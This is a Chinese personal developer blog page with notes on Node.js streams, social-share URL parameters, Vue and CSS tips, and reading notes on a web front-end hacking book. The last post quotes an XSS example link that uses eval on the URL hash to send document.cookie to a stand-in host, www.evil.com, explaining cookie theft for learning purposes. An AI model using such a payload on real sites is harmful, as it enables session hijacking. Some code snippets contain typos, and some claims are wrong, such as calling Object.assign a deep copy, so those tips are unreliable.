<h5 id="转换图片为base64"><a href="#转换图片为base64" class="headerlink" title="转换图片为base64"></a>转换图片为base64</h5><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line">fs.readFile(<span class="string">'logo.png'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">err,origin_buff</span>)</span>&#123;</span><br><span class="line">    fs.writeFile(<span class="string">'logo_buffer.png'</span>.origin_buff,<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(err) <span class="built_in">console</span>.log(err)</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="keyword">var</span> base64Img=origin_buff.toString(<span class="string">'base64'</span>)</span><br><span class="line">    <span class="keyword">var</span> decodedImg = <span class="keyword">new</span> Buffer(base64Img ,<span class="string">'base64'</span>)<span class="comment">//拼装成data:image/png,base64,decodedImg才可使用</span></span><br><span class="line">    <span class="built_in">console</span>.log(Buffer.compare(origin_buff,decodedImg))<span class="comment">//0</span></span><br><span class="line"></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<h3 id="Stream-边读边写"><a href="#Stream-边读边写" class="headerlink" title="Stream 边读边写"></a>Stream 边读边写</h3><h5 id="转换图片为base64-1"><a href="#转换图片为base64-1" class="headerlink" title="转换图片为base64"></a>转换图片为base64</h5><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//stream_logo.js</span></span><br><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line">fs.writeFileSync(<span class="string">'stream_logo.png'</span>,fs.readFileSync(<span class="string">'logo.png'</span>));<span class="comment">//大文件会爆仓</span></span><br></pre></td></tr></table></figure>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"><span class="keyword">var</span> n = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">var</span> readStream = fs.createReadStream(<span class="string">'stream_logo.js'</span>)</span><br><span class="line">readStream</span><br><span class="line">.on(<span class="string">'data'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">chunk</span>)</span>&#123;</span><br><span class="line">    n++</span><br><span class="line">    <span class="built_in">console</span>.log(Buffer.isBuffer(chunk));<span class="comment">//true 一次大概64TB</span></span><br><span class="line">    <span class="built_in">console</span>.log(chunk.toString(<span class="string">'utf8'</span>));<span class="comment">//stream_logo.js内容</span></span><br><span class="line">    readStream.pause();</span><br><span class="line">    setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        readStream.resume()</span><br><span class="line">    &#125;,<span class="number">3000</span>)</span><br><span class="line">&#125;)</span><br><span class="line">.on(<span class="string">'readable'</span>,<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;&#125;)</span><br><span class="line">.on(<span class="string">'end'</span>,<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123; <span class="built_in">console</span>.log(n)&#125;)</span><br><span class="line">.on(<span class="string">'close'</span>,<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;&#125;)</span><br><span class="line">.on(<span class="string">'error'</span>,<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;&#125;)</span><br></pre></td></tr></table></figure>
<h5 id="复制文件"><a href="#复制文件" class="headerlink" title="复制文件"></a>复制文件</h5><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"><span class="keyword">var</span> readStream = fs.createReadStream(<span class="string">'1.mp4'</span>);</span><br><span class="line"><span class="keyword">var</span> writeStream = fs.createWriteStream(<span class="string">'copy.mp4'</span>);</span><br><span class="line">readStream.on(<span class="string">'data'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">chunk</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(writeStream.write(chunk)===<span class="literal">false</span>)&#123;<span class="comment">//数据还在缓存区，读得快写得慢</span></span><br><span class="line">        readStream.pause();<span class="comment">//先暂停</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line">writeStream.on(<span class="string">'drain'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">chunk</span>)</span>&#123;<span class="comment">//已经写完了</span></span><br><span class="line">    readStream.resume();  </span><br><span class="line">&#125;)</span><br><span class="line">readStream.on(<span class="string">'end'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">chunk</span>)</span>&#123;</span><br><span class="line">    writeStream.end()</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<h5 id="强大的Pipe"><a href="#强大的Pipe" class="headerlink" title="强大的Pipe"></a>强大的Pipe</h5><p>Duplex双工<br>Transform双工，但是不存储数据<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">http.createServer(<span class="function"><span class="keyword">function</span>(<span class="params">req,res</span>)</span>&#123;</span><br><span class="line">    <span class="comment">// fs.readFile('logo.png',function(err,data)&#123;</span></span><br><span class="line">    <span class="comment">//     if(err)&#123;</span></span><br><span class="line">    <span class="comment">//         res.end('file is not exist!')</span></span><br><span class="line">    <span class="comment">//     &#125;else&#123;</span></span><br><span class="line">    <span class="comment">//         res.writeHead(200，&#123;‘Content-Type':'text/html'&#125;);</span></span><br><span class="line">    <span class="comment">//         res.end(data)</span></span><br><span class="line">    <span class="comment">//     &#125;</span></span><br><span class="line">    <span class="comment">// &#125;)</span></span><br><span class="line">    fs.createReadStream(<span class="string">'logo.png'</span>).pipe(res);<span class="comment">//返回给浏览器</span></span><br><span class="line">    request(<span class="string">'https://imoooc/logo.png'</span>).pipe(res)<span class="comment">//同上 边下载边pipe</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p>
<p>上面的复制文件代码就可以改成<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line">fs.createReadStream(<span class="string">'1.mp4'</span>).pipe(fs.createWriteStream(<span class="string">'copy.mp4'</span>))</span><br></pre></td></tr></table></figure></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> Readable = <span class="built_in">require</span>(<span class="string">'stream'</span>).Readable</span><br><span class="line"><span class="keyword">var</span> Writable = <span class="built_in">require</span>(<span class="string">'stream'</span>).Writable</span><br><span class="line"><span class="keyword">var</span> readStream = <span class="keyword">new</span> Readable()</span><br><span class="line"><span class="keyword">var</span> writeStream = <span class="keyword">new</span> Writable()</span><br><span class="line">readStream.push(<span class="string">'I'</span>)</span><br><span class="line">readStream.push(<span class="string">'Love'</span>)</span><br><span class="line">readStream.push(<span class="string">'You\n'</span>)</span><br><span class="line">readStream.push(<span class="string">'null'</span>)</span><br><span class="line">writeStream._write = <span class="function"><span class="keyword">function</span>(<span class="params">chunk,encode,cb</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(chunk.toString())</span><br><span class="line">    cb()</span><br><span class="line">&#125;</span><br><span class="line">readStream.pipe(writeStream)</span><br></pre></td></tr></table></figure>
<p>定制流<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">funcion ReadStream()&#123;</span><br><span class="line">    stream.Readable.call(<span class="keyword">this</span>)</span><br><span class="line">&#125;</span><br><span class="line">util.inherits(ReadStream,stream.Readable);<span class="comment">//继承原型</span></span><br><span class="line">ReadStream.prototype._read=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.push(<span class="string">'I'</span>)</span><br><span class="line">    <span class="keyword">this</span>.push(<span class="string">'Love'</span>)</span><br><span class="line">    <span class="keyword">this</span>.push(<span class="string">'You\n'</span>)</span><br><span class="line">    <span class="keyword">this</span>.push(<span class="string">'null'</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">funcion WritStream()&#123;</span><br><span class="line">    stream.Writable.call(<span class="keyword">this</span>)</span><br><span class="line">    <span class="keyword">this</span>._cached=<span class="keyword">new</span> Buffer(<span class="string">''</span>)</span><br><span class="line">&#125;</span><br><span class="line">util.inherits(WritStream,stream.Writable);</span><br><span class="line">WritStream.prototype._write = <span class="function"><span class="keyword">function</span>(<span class="params">chunk,encode,cb</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(chunk.toString())</span><br><span class="line">    cb()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">TransfromStream</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    stream.Transform.call(<span class="keyword">this</span>)</span><br><span class="line">&#125;</span><br><span class="line">util.inherits(TransfromStream,stream.Transfrom);</span><br><span class="line">TransfromStream.prototype._transform= <span class="function"><span class="keyword">function</span>(<span class="params">chunk,encode,cb</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.push(chunk)</span><br><span class="line">    cb()</span><br><span class="line">&#125;</span><br><span class="line">TransfromStream.prototype.flush= <span class="function"><span class="keyword">function</span>(<span class="params">cb</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.push(<span class="string">'On Yeah!'</span>)</span><br><span class="line">    cb()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> rs= <span class="keyword">new</span> ReadStream()</span><br><span class="line"><span class="keyword">var</span> ws = <span class="keyword">new</span> WritStream();</span><br><span class="line"><span class="keyword">var</span> ts = <span class="keyword">new</span> TransfromStream()</span><br><span class="line"></span><br><span class="line">rs.pipe(ts).pipe(ws)</span><br></pre></td></tr></table></figure></p>
<p>createReadStream是给你一个ReadableStream，你可以听它的’data’，一点一点儿处理文件，用过的部分会被GC（垃圾回收），所以占内存少。</p>
<p>readFile是把整个文件全部读到内存里，这种方式是把文件内容全部读入内存，然后再写入文件。对于小型的文本文件，这没有多大问题。但是对于体积较大的二进制文件，比如音频、视频文件，动辄几个GB大小，如果使用这种方法，很容易使内存<code>“爆仓”</code>。理想的方法应该是读一部分，写一部分，不管文件有多大，只要时间允许，总会处理完成，这里就需要用到流的概念</p>
<p>node不适合的：<br>极高并发数（电商）、<br>密集CPU运算（最优化路线）、<br>高安全高可靠性（银行）、<br>内存精密控制和释放</p>
<p>express中，req.param()方法是对params\body\query的封装，取值顺序是params-&gt;body-&gt;query。</p>
<p>非简单请求的CORS（跨域）请求，会在正式通信之前，增加一次HTTP查询请求，称为”预检”请求（preflight）。在你的post请求之前会发送一次OPTIONS请求<br><a href="http://www.ruanyifeng.com/blog/2016/04/cors.html" target="_blank" rel="noopener">跨域资源共享 CORS 详解</a></p>
<p>服务端重启会清除session.session持久化方法：cookies,redis,MongoDB,硬盘内存<br>为了弥补HTTP的无状态，就有了cookies和session.之前没有seesion的时候都用的是cookies.<br>当程序需要给某个客户端请求创建一个session时，服务器会检查请求里面是否包含sessionid,服务器把这个session找出来就行了。没有就创建，返回sessionid给客户端保存.<br><a href="https://www.jianshu.com/p/8f4cc45d712e" target="_blank" rel="noopener">koa-session</a></p>

        
        
        <p class="article-more-link">
          
       </p>
    </div>
    <footer class="article-footer clearfix">
<div class="article-catetags">

<div class="article-categories">
  <span></span>
  <a class="article-category-link" href="/categories/学习/">学习</a>►<a class="article-category-link" href="/categories/学习/读书笔记/">读书笔记</a>
</div>


</div>




<div class="comments-count">
	
</div>

</footer>


    </article>






   
    
    <article class="post-expand post" itemprop="articleBody"> 
        <header class="article-info clearfix">
  <h1 itemprop="name">
    
      <a href="/study/2018/7/zongjie.html" title="2018-7至2018-9总结" itemprop="url">2018-7至2018-9总结</a>
  </h1>
  <p class="article-author">By
       
		<a href="/about" title="Ruiyu Lin" target="_blank" itemprop="author">Ruiyu Lin</a>
		
  <p class="article-time">
    <time datetime="2018-07-03T16:00:00.000Z" itemprop="datePublished"> Published 2018-07-04</time>
    
  </p>
</header>
    <div class="article-content">
        
        <h3 id="社交分享接口"><a href="#社交分享接口" class="headerlink" title="社交分享接口"></a>社交分享接口</h3><p>qzone       : ‘<a href="http://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=" target="_blank" rel="noopener">http://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=</a>&amp;title=&amp;desc=&amp;summary=&amp;site=‘,<br>qq          : ‘<a href="http://connect.qq.com/widget/shareqq/index.html?url=" target="_blank" rel="noopener">http://connect.qq.com/widget/shareqq/index.html?url=</a>&amp;title=&amp;source=&amp;desc=&amp;pics=‘,<br>tencent     : ‘<a href="http://share.v.t.qq.com/index.php?c=share&amp;a=index&amp;title=" target="_blank" rel="noopener">http://share.v.t.qq.com/index.php?c=share&amp;a=index&amp;title=</a>&amp;url=&amp;pic=‘,<br>weibo       : ‘<a href="https://service.weibo.com/share/share.php?url=" target="_blank" rel="noopener">https://service.weibo.com/share/share.php?url=</a>&amp;title=&amp;pic=&amp;appkey=‘,</p>
<p>douban      : ‘<a href="http://shuo.douban.com/!service/share?href=" target="_blank" rel="noopener">http://shuo.douban.com/!service/share?href=</a>&amp;name=&amp;text=&amp;image=&amp;starid=0&amp;aid=0&amp;style=11’,<br>diandian    : ‘<a href="http://www.diandian.com/share?lo=" target="_blank" rel="noopener">http://www.diandian.com/share?lo=</a>&amp;ti=&amp;type=link’,<br>linkedin    : ‘<a href="http://www.linkedin.com/shareArticle?mini=true&amp;ro=true&amp;title=" target="_blank" rel="noopener">http://www.linkedin.com/shareArticle?mini=true&amp;ro=true&amp;title=</a>&amp;url=&amp;summary=&amp;source=&amp;armin=armin’,<br>facebook    : ‘<a href="https://www.facebook.com/sharer/sharer.php?u=" target="_blank" rel="noopener">https://www.facebook.com/sharer/sharer.php?u=</a>&amp;title=&amp;description=&amp;caption=&amp;link=&amp;picture=‘,<br>twitter     : ‘<a href="https://twitter.com/intent/tweet?text=" target="_blank" rel="noopener">https://twitter.com/intent/tweet?text=</a>&amp;url=&amp;via=‘,<br>google      : ‘<a href="https://plus.google.com/share?url=" target="_blank" rel="noopener">https://plus.google.com/share?url=</a>‘</p>
<h5 id="微博"><a href="#微博" class="headerlink" title="微博"></a>微博</h5><p><a href="http://service.weibo.com/share/share.php" target="_blank" rel="noopener">http://service.weibo.com/share/share.php</a>?<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">url=</span><br><span class="line">&amp;title=</span><br><span class="line">&amp;pic=可为空</span><br><span class="line">&amp;appkey=可为空</span><br></pre></td></tr></table></figure></p>
<h5 id="发送给QQ好友"><a href="#发送给QQ好友" class="headerlink" title="发送给QQ好友"></a>发送给QQ好友</h5><p><a href="http://connect.qq.com/widget/shareqq/index.html" target="_blank" rel="noopener">http://connect.qq.com/widget/shareqq/index.html</a>?<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">url=</span><br><span class="line">title=</span><br><span class="line">source= 默认读取head标签的site：&lt;meta name=&quot;site&quot; content=&quot;http://overtrue&quot; /&gt;</span><br><span class="line">desc=默认读取head标签的description：&lt;meta name=&quot;description&quot; content=&quot;http://overtrue&quot; /&gt;</span><br><span class="line">pics=</span><br></pre></td></tr></table></figure></p>
<h5 id="腾讯微博"><a href="#腾讯微博" class="headerlink" title="腾讯微博"></a>腾讯微博</h5><p><a href="http://share.v.t.qq.com/index.php" target="_blank" rel="noopener">http://share.v.t.qq.com/index.php</a>?<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">c=share</span><br><span class="line">a=index</span><br><span class="line">title=</span><br><span class="line">url=</span><br><span class="line">pic=</span><br></pre></td></tr></table></figure></p>
<h5 id="豆瓣"><a href="#豆瓣" class="headerlink" title="豆瓣"></a>豆瓣</h5><p><a href="https://www.douban.com/share/service" target="_blank" rel="noopener">https://www.douban.com/share/service</a>?<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">href=</span><br><span class="line">&amp;name=</span><br><span class="line">&amp;text=</span><br></pre></td></tr></table></figure></p>
<h5 id="豆瓣-1"><a href="#豆瓣-1" class="headerlink" title="豆瓣"></a>豆瓣</h5><p><a href="http://shuo.douban.com/!service/share" target="_blank" rel="noopener">http://shuo.douban.com/!service/share</a>?<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">href=</span><br><span class="line">name=</span><br><span class="line">text=</span><br><span class="line">image=</span><br><span class="line">starid=0</span><br><span class="line">aid=0</span><br><span class="line">style=11</span><br></pre></td></tr></table></figure></p>
<h5 id="QQ空间-这个好像腾讯坏了，都是undefined"><a href="#QQ空间-这个好像腾讯坏了，都是undefined" class="headerlink" title="QQ空间(这个好像腾讯坏了，都是undefined)"></a>QQ空间(这个好像腾讯坏了，都是undefined)</h5><p><a href="http://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey" target="_blank" rel="noopener">http://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey</a>?<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">url=</span><br><span class="line">desc=</span><br><span class="line">summary=</span><br><span class="line">site=</span><br></pre></td></tr></table></figure></p>
<h5 id="linkin"><a href="#linkin" class="headerlink" title="linkin"></a>linkin</h5><p><a href="http://www.linkedin.com/shareArticle" target="_blank" rel="noopener">http://www.linkedin.com/shareArticle</a>?<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mini=true</span><br><span class="line">ro=true</span><br><span class="line">title=</span><br><span class="line">url=</span><br><span class="line">summary=</span><br><span class="line">source=</span><br><span class="line">armin=armin</span><br></pre></td></tr></table></figure></p>
<h5 id="点点（不知道是什么东西）"><a href="#点点（不知道是什么东西）" class="headerlink" title="点点（不知道是什么东西）"></a>点点（不知道是什么东西）</h5><p><a href="http://www.diandian.com/share" target="_blank" rel="noopener">http://www.diandian.com/share</a>?<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">lo= 文章链接</span><br><span class="line">ti= 文章标题</span><br><span class="line">type=link</span><br></pre></td></tr></table></figure></p>
<h5 id="facebook"><a href="#facebook" class="headerlink" title="facebook"></a>facebook</h5><p><a href="https://www.facebook.com/sharer/sharer.php" target="_blank" rel="noopener">https://www.facebook.com/sharer/sharer.php</a>?<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">u= 文章链接</span><br></pre></td></tr></table></figure></p>
<h5 id="twitter"><a href="#twitter" class="headerlink" title="twitter"></a>twitter</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">https://twitter.com/intent/tweet?</span><br><span class="line">text= 文章标题</span><br><span class="line">url=</span><br><span class="line">via= 好像是域名</span><br></pre></td></tr></table></figure>
<h5 id="google"><a href="#google" class="headerlink" title="google"></a>google</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://plus.google.com/share?</span><br><span class="line">url=</span><br></pre></td></tr></table></figure>
<h3 id="vue强制更新"><a href="#vue强制更新" class="headerlink" title="vue强制更新"></a>vue强制更新</h3><p>用vue.$set不行，watch不行，试试$forceUpdate。<br>还有一种办法，再把值重新复制一遍也是可以的<br><code>this.obj = Object.assign({},this.obj)</code></p>
<h3 id="在Vue中使用sass及sass图片路径问题"><a href="#在Vue中使用sass及sass图片路径问题" class="headerlink" title="在Vue中使用sass及sass图片路径问题"></a>在Vue中使用sass及sass图片路径问题</h3><p><a href="https://www.jianshu.com/p/5e81814f8d8c" target="_blank" rel="noopener">https://www.jianshu.com/p/5e81814f8d8c</a></p>
<h3 id="CORS跨域请求会先发option请求，如果server返回access-control-allow-origin头为-或者和当前域名一致的话，才会进入第二段的真正请求。"><a href="#CORS跨域请求会先发option请求，如果server返回access-control-allow-origin头为-或者和当前域名一致的话，才会进入第二段的真正请求。" class="headerlink" title="CORS跨域请求会先发option请求，如果server返回access-control-allow-origin头为*或者和当前域名一致的话，才会进入第二段的真正请求。"></a>CORS跨域请求会先发option请求，如果server返回access-control-allow-origin头为*或者和当前域名一致的话，才会进入第二段的真正请求。</h3><h3 id="禁止缓存数据deactivated"><a href="#禁止缓存数据deactivated" class="headerlink" title="禁止缓存数据deactivated"></a>禁止缓存数据deactivated</h3><p> 防止下次选择数据不更新<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">deactivated () &#123;</span><br><span class="line">  <span class="keyword">this</span>.$destroy(<span class="literal">true</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="深拷贝"><a href="#深拷贝" class="headerlink" title="深拷贝"></a>深拷贝</h3><p> <code>arr.slice()</code><br> 如果obj所有值都是非引用类型，那么obj.slice(0)与深浅拷贝没有差别；</p>
<p>如果obj有引用类型的元素的话，obj.slice(0)仅仅是复制了元素的地址，，obj.slice(0)可看作浅拷贝。</p>
<p>对象深拷贝 <code>Object.assign({},obj)</code>,不要用JSON.parse(JSON.stringify(obj)),太慢</p>
<h3 id="价格标签"><a href="#价格标签" class="headerlink" title="价格标签"></a>价格标签</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.price-label</span>&#123;</span><br><span class="line">    <span class="attribute">position</span>: relative;</span><br><span class="line">    <span class="attribute">display</span>: inline-block;</span><br><span class="line">    <span class="attribute">color</span>: <span class="number">#f15533</span>;</span><br><span class="line">    <span class="attribute">border-color</span>: <span class="number">#f15533</span>;</span><br><span class="line">    <span class="attribute">font-size</span>: <span class="number">12px</span>;</span><br><span class="line">    <span class="attribute">line-height</span>: <span class="number">18px</span>;</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">0</span> <span class="number">7.5px</span>;</span><br><span class="line">    <span class="attribute">z-index</span>: <span class="number">2</span>;</span><br><span class="line">    <span class="attribute">vertical-align</span>: super;</span><br><span class="line">    &amp;::before&#123;</span><br><span class="line">            <span class="selector-tag">position</span>: <span class="selector-tag">absolute</span>;</span><br><span class="line">            <span class="selector-tag">z-index</span>: 1;</span><br><span class="line">            <span class="selector-tag">content</span>: "";</span><br><span class="line">            <span class="selector-tag">top</span>: 0;</span><br><span class="line">            <span class="selector-tag">right</span>: 0;</span><br><span class="line">            <span class="selector-tag">bottom</span>: 0;</span><br><span class="line">            <span class="selector-tag">left</span>: 0;</span><br><span class="line">            <span class="selector-tag">border</span>: 1<span class="selector-tag">px</span> <span class="selector-tag">solid</span> <span class="selector-id">#ccc</span>;</span><br><span class="line">            <span class="selector-tag">border-color</span>: <span class="selector-tag">inherit</span>;</span><br><span class="line">            <span class="selector-tag">border-radius</span>: 2<span class="selector-tag">px</span>;</span><br><span class="line">            <span class="selector-tag">transform</span>: <span class="selector-tag">skew</span>(<span class="selector-tag">-11deg</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="事件冒泡到父容器或某个祖先容器停止"><a href="#事件冒泡到父容器或某个祖先容器停止" class="headerlink" title="事件冒泡到父容器或某个祖先容器停止"></a>事件冒泡到父容器或某个祖先容器停止</h3><p>在父容器或某个祖先容器上绑定一个<a href="mailto:``@click.stop" target="_blank" rel="noopener">``@click.stop</a>=”stop”<code></code><br>stop函数为一个空函数即可</p>

        
        
        <p class="article-more-link">
          
       </p>
    </div>
    <footer class="article-footer clearfix">
<div class="article-catetags">

<div class="article-categories">
  <span></span>
  <a class="article-category-link" href="/categories/学习/">学习</a>►<a class="article-category-link" href="/categories/学习/每月总结/">每月总结</a>
</div>


</div>




<div class="comments-count">
	
</div>

</footer>


    </article>






   
    
    <article class="post-expand post" itemprop="articleBody"> 
        <header class="article-info clearfix">
  <h1 itemprop="name">
    
      <a href="/study/2018/6/webSafety.html" title="读《web前端黑客技术揭秘》" itemprop="url">读《web前端黑客技术揭秘》</a>
  </h1>
  <p class="article-author">By
       
		<a href="/about" title="Ruiyu Lin" target="_blank" itemprop="author">Ruiyu Lin</a>
		
  <p class="article-time">
    <time datetime="2018-05-31T16:00:00.000Z" itemprop="datePublished"> Published 2018-06-01</time>
    
  </p>
</header>
    <div class="article-content">
        
        <p>XSS 跨站脚本攻击<br>如果攻击者构造出如下链接：<br><a href="http://www.foo.com/info.html#new%20Image().src=&quot;http://www.evil.com/steal.php?c=&quot;+escape(document.cookie)" target="_blank" rel="noopener">http://www.foo.com/info.html#new%20Image().src=&quot;http://www.evil.com/steal.php?c=&quot;+escape(document.cookie)</a><br>浏览器解释执行后，下面的语句：<br>eval(location.hash.substr(1));<br>会变为：<br>eval(‘new Image().src=”<a href="http://www.evil.com/steal.php?c=&quot;+escape" target="_blank" rel="noopener">http://www.evil.com/steal.php?c=&quot;+escape</a>(document.<br>cookie)’)<br>Cookies 会话信息就会被盗取到黑客的网站上</p>
<p>CSRF 是跨站请求伪造，CSRF 会借用目标用户的权限做一些借刀杀人的事（注意是“借用”，而不是“盗取”<br>目标权限），然后去做坏事，<br>“盗取”通常是XSS（跨站脚本攻击）最喜欢做的事。</p>
<p>APT（持久化威胁）攻击<br>如果是个反射型的XSS，IE 8/IE 9/Chome 直接就给拦截了。</p>
